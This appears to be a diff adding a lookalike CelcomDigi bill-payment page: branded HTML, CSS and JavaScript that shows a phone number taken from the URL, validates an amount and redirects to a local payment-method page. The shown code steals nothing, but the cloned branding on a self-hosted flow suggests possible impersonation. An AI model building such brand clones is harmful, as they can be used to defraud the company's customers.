@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>CelcomDigi | Fast and Secure Bill Payment</title>
+  <link rel="icon" href="/get-assets/images/favicon.ico" type="image/x-icon" />
+  <link rel="stylesheet" href="/get-assets/css/app-original.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css?family=Lato:400,700&display=swap');
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Lato', 'Helvetica Neue', Arial, sans-serif;
+      background: #fff;
+      color: #1a1a1a;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== HEADER ===== */
+    .header {
+      background: #001871;
+      padding: 12px 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      position: sticky;
+      top: 0;
+      z-index: 100;
+      width: 100%;
+    }
+    .header-logo img { height: 36px; }
+    .header-actions { display: flex; align-items: center; gap: 10px; }
+    .btn-shop, .btn-lang {
+      display: flex; align-items: center; gap: 6px;
+      background: transparent; border: 1.5px solid rgba(255,255,255,0.8);
+      color: #fff; font-size: 13px; font-weight: 600;
+      padding: 7px 16px; border-radius: 50px; cursor: pointer;
+      text-decoration: none; transition: all 0.2s;
+      font-family: 'Lato', sans-serif;
+    }
+    .btn-shop:hover, .btn-lang:hover { background: rgba(255,255,255,0.15); }
+    .btn-shop svg, .btn-lang svg { width: 16px; height: 16px; }
+
+    /* ===== HERO ===== */
+    .hero {
+      background: linear-gradient(135deg, #001870 0%, #0064dc 60%, #0088ff 100%);
+      position: relative;
+      overflow: hidden;
+      padding: 32px 24px 40px;
+      text-align: center;
+    }
+    .hero::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background-image: url('/get-assets/images/bg-arch-edit.webp');
+      background-size: cover;
+      background-position: center;
+      opacity: 0.5;
+    }
+    .hero h1 {
+      position: relative;
+      color: #fff;
+      font-size: clamp(20px, 4vw, 32px);
+      font-weight: 700;
+    }
+
+    /* ===== MAIN CONTENT ===== */
+    .main-content {
+      flex: 1;
+      padding: 24px 16px 80px;
+      max-width: 900px;
+      margin: 0 auto;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+    @media (min-width: 768px) {
+      .main-content {
+        flex-direction: row;
+        gap: 64px;
+        padding: 32px 32px 80px;
+        align-items: flex-start;
+      }
+    }
+
+    /* ===== LEFT COLUMN ===== */
+    .left-col {
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+    }
+
+    /* ===== SIM BANNER ===== */
+    .sim-banner {
+      background: linear-gradient(90.25deg, #338ffd 0.24%, #015cc9 57.47%);
+      border-radius: 16px;
+      padding: 16px;
+      color: #fff;
+      position: relative;
+      overflow: hidden;
+      min-height: 120px;
+    }
+    .sim-banner-label {
+      font-size: 14px;
+      font-weight: 400;
+      margin-bottom: 12px;
+      opacity: 0.9;
+    }
+    .sim-banner-number {
+      font-size: 24px;
+      font-weight: 700;
+      line-height: 1.2;
+    }
+    .sim-banner-carrier {
+      font-size: 14px;
+      font-weight: 700;
+      margin-top: 2px;
+    }
+    .sim-banner-img {
+      position: absolute;
+      bottom: 0;
+      right: -8px;
+      width: 180px;
+      z-index: 0;
+    }
+
+    /* ===== PAY BILL FORM ===== */
+    .pay-bill-section {
+      margin-top: 16px;
+      flex: 1;
+    }
+    .pay-bill-title {
+      font-size: 20px;
+      font-weight: 800;
+      color: #1a1a1a;
+      margin-bottom: 6px;
+    }
+    .pay-bill-desc {
+      font-size: 14px;
+      color: #374151;
+      line-height: 1.5;
+      margin-bottom: 16px;
+    }
+
+    /* ===== AMOUNT INPUT ===== */
+    .amount-wrapper {
+      position: relative;
+      margin-bottom: 6px;
+    }
+    .amount-input {
+      width: 100%;
+      border: 1.5px solid #d1d5db;
+      border-radius: 8px;
+      padding: 22px 12px 8px 12px;
+      font-size: 16px;
+      font-family: 'Lato', sans-serif;
+      outline: none;
+      transition: border-color 0.2s;
+      background: #fff;
+    }
+    .amount-input:focus {
+      border-color: #015cc9;
+    }
+    .amount-label {
+      position: absolute;
+      top: 50%;
+      left: 12px;
+      transform: translateY(-50%);
+      font-size: 15px;
+      color: #9ca3af;
+      pointer-events: none;
+      transition: all 0.15s ease;
+    }
+    .amount-input:focus ~ .amount-label,
+    .amount-input:not(:placeholder-shown) ~ .amount-label {
+      top: 8px;
+      transform: none;
+      font-size: 11px;
+      color: #6b7280;
+    }
+    .amount-hint {
+      font-size: 11px;
+      color: #475467;
+      margin-bottom: 16px;
+    }
+    .terms-text {
+      font-size: 11px;
+      color: #475467;
+      margin-top: 8px;
+    }
+    .terms-text a {
+      color: #0064dc;
+      text-decoration: none;
+    }
+    .terms-text a:hover { text-decoration: underline; }
+
+    /* ===== RIGHT COLUMN - PRICE SUMMARY ===== */
+    .right-col {
+      width: 100%;
+      margin-top: 0;
+    }
+    @media (min-width: 768px) {
+      .right-col {
+        width: auto;
+        flex: auto;
+        padding-right: 32px;
+      }
+    }
+
+    .price-summary-card {
+      border: 1px solid #e5e7eb;
+      border-radius: 16px 16px 0 0;
+      padding: 16px;
+      background: #fff;
+      box-shadow: 0 -4px 6px -1px rgba(0,0,0,0.05);
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      z-index: 50;
+    }
+    @media (min-width: 768px) {
+      .price-summary-card {
+        position: sticky;
+        top: 80px;
+        border-radius: 16px;
+        box-shadow: 0 1px 4px rgba(0,0,0,0.08);
+      }
+    }
+
+    .price-summary-title {
+      font-size: 14px;
+      font-weight: 600;
+      color: #374151;
+      margin-bottom: 12px;
+    }
+    .price-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+    .price-label {
+      font-size: 16px;
+      font-weight: 700;
+      color: #1a1a1a;
+    }
+    .price-value {
+      font-size: 20px;
+      font-weight: 700;
+      color: #0064dc;
+    }
+    .btn-pay-now {
+      width: 100%;
+      background: linear-gradient(90.25deg, #338ffd 0.24%, #015cc9 57.47%);
+      color: #fff;
+      border: none;
+      border-radius: 50px;
+      padding: 14px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Lato', sans-serif;
+      transition: opacity 0.2s;
+    }
+    .btn-pay-now:hover { opacity: 0.9; }
+    .btn-pay-now:disabled {
+      background: #d1d5db;
+      color: #9ca3af;
+      cursor: not-allowed;
+    }
+
+    /* ===== FOOTER ===== */
+    .footer {
+      background: #001871;
+      color: rgba(255,255,255,0.7);
+      text-align: center;
+      padding: 16px 24px;
+      font-size: 12px;
+    }
+
+    /* ===== LOADING OVERLAY ===== */
+    .loading-overlay {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      z-index: 200;
+      align-items: center;
+      justify-content: center;
+    }
+    .loading-overlay.visible { display: flex; }
+    .loading-spinner {
+      background: #fff;
+      border-radius: 16px;
+      padding: 32px 40px;
+      text-align: center;
+    }
+    .spinner-circle {
+      width: 48px;
+      height: 48px;
+      border: 4px solid #e5e7eb;
+      border-top-color: #015cc9;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      margin: 0 auto 16px;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .spinner-text { font-size: 14px; color: #374151; font-weight: 600; }
+
+    /* ===== MOBILE SPACER ===== */
+    .mobile-spacer {
+      height: 90px;
+    }
+    @media (min-width: 768px) {
+      .mobile-spacer { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- LOADING OVERLAY -->
+  <div class="loading-overlay" id="loadingOverlay">
+    <div class="loading-spinner">
+      <div class="spinner-circle"></div>
+      <div class="spinner-text">Processing...</div>
+    </div>
+  </div>
+
+  <!-- HEADER -->
+  <header class="header">
+    <a href="/" class="header-logo">
+      <img src="https://assets-global.website-files.com/637c596725cb8b7f82fe360b/6548631227a35c7c91ebbeea_CelcomDigi_Logo_Inverted.svg" alt="CelcomDigi" />
+    </a>
+    <div class="header-actions">
+      <a href="https://shop.celcomdigi.com/home" class="btn-shop" target="_blank">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <path d="M6 2L3 6v14a2 2 0 002 2h14a2 2 0 002-2V6l-3-4z"/><line x1="3" y1="6" x2="21" y2="6"/><path d="M16 10a4 4 0 01-8 0"/>
+        </svg>
+        SHOP
+      </a>
+      <button class="btn-lang">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+          <circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 014 10 15.3 15.3 0 01-4 10 15.3 15.3 0 01-4-10 15.3 15.3 0 014-10z"/>
+        </svg>
+        EN
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="width:12px;height:12px">
+          <polyline points="6 9 12 15 18 9"/>
+        </svg>
+      </button>
+    </div>
+  </header>
+
+  <!-- HERO -->
+  <div class="hero">
+    <h1>Fast and Secure Bill Payment</h1>
+  </div>
+
+  <!-- MAIN CONTENT -->
+  <div class="main-content">
+    <!-- LEFT COLUMN -->
+    <div class="left-col">
+      <!-- SIM BANNER -->
+      <div class="sim-banner">
+        <div class="sim-banner-label">Mobile number</div>
+        <div class="sim-banner-number" id="displayNumber">60162556095</div>
+        <div class="sim-banner-carrier" id="displayCarrier">DIGI</div>
+        <img class="sim-banner-img" src="/get-assets/images/sim.png" alt="SIM Card" />
+      </div>
+
+      <!-- PAY BILL FORM -->
+      <div class="pay-bill-section">
+        <p class="pay-bill-title">Pay Bill</p>
+        <p class="pay-bill-desc">You can check your bill via our mobile app or your email for the amount you need to pay.</p>
+
+        <div class="amount-wrapper">
+          <input
+            type="text"
+            class="amount-input"
+            id="amountInput"
+            placeholder="Payment amount"
+            inputmode="decimal"
+            autocomplete="off"
+          />
+          <label class="amount-label" for="amountInput">Payment amount</label>
+        </div>
+        <p class="amount-hint">Minimum payment is RM1 and maximum is RM2,500.</p>
+
+        <p class="terms-text">
+          By clicking 'Pay Now,' you agree to the
+          <a href="https://get.celcomdigi.com/global-assets/rnb/tnc/Terms+%26+Conditions+-+Reloads+and+Bill+Payments.pdf" target="_blank">CelcomDigi Terms and Conditions</a>.
+        </p>
+      </div>
+    </div>
+
+    <!-- SPACER FOR MOBILE -->
+    <div class="mobile-spacer"></div>
+
+    <!-- RIGHT COLUMN - PRICE SUMMARY -->
+    <div class="right-col">
+      <div class="price-summary-card">
+        <p class="price-summary-title">Price Summary</p>
+        <div class="price-row">
+          <span class="price-label">Total</span>
+          <span class="price-value" id="totalDisplay">RM0.00</span>
+        </div>
+        <button class="btn-pay-now" id="payNowBtn" onclick="proceedToPayment()">Pay Now</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    © Copyright 2026 CelcomDigi Berhad [Registration No. 199701009694 (425190-X)]. All Rights Reserved.
+  </footer>
+
+  <script>
+    // Get URL params
+    const params = new URLSearchParams(window.location.search);
+    const mobileNumber = params.get('number') || '60162556095';
+    const carrier = params.get('carrier') || 'DIGI';
+
+    // Display number and carrier
+    document.getElementById('displayNumber').textContent = mobileNumber;
+    document.getElementById('displayCarrier').textContent = carrier.toUpperCase();
+
+    // Format amount input
+    const amountInput = document.getElementById('amountInput');
+    const totalDisplay = document.getElementById('totalDisplay');
+    const payNowBtn = document.getElementById('payNowBtn');
+
+    amountInput.addEventListener('input', function() {
+      // Allow only numbers and one decimal point
+      let val = this.value.replace(/[^0-9.]/g, '');
+      // Limit to 2 decimal places
+      const parts = val.split('.');
+      if (parts.length > 2) val = parts[0] + '.' + parts.slice(1).join('');
+      if (parts[1] && parts[1].length > 2) val = parts[0] + '.' + parts[1].slice(0, 2);
+      this.value = val;
+
+      const num = parseFloat(val) || 0;
+      totalDisplay.textContent = 'RM' + num.toFixed(2);
+
+      // Validate range
+      if (num >= 1 && num <= 2500) {
+        payNowBtn.disabled = false;
+        payNowBtn.style.background = 'linear-gradient(90.25deg, #338ffd 0.24%, #015cc9 57.47%)';
+      } else {
+        payNowBtn.disabled = true;
+        payNowBtn.style.background = '';
+      }
+    });
+
+    function proceedToPayment() {
+      const amount = parseFloat(amountInput.value) || 0;
+      if (amount < 1 || amount > 2500) {
+        amountInput.style.borderColor = '#ef4444';
+        amountInput.focus();
+        return;
+      }
+      // Show loading
+      document.getElementById('loadingOverlay').classList.add('visible');
+      // Redirect to payment method selection page
+      setTimeout(() => {
+        const ref = 'NGOS' + Date.now();
+        window.location.href = `/payment-method?number=${encodeURIComponent(mobileNumber)}&carrier=${encodeURIComponent(carrier)}&amount=${amount}&ref=${ref}`;
+      }, 800);
+    }
+
+    // Initialize button state
+    payNowBtn.disabled = true;
+  </script>
+</body>
+</html>
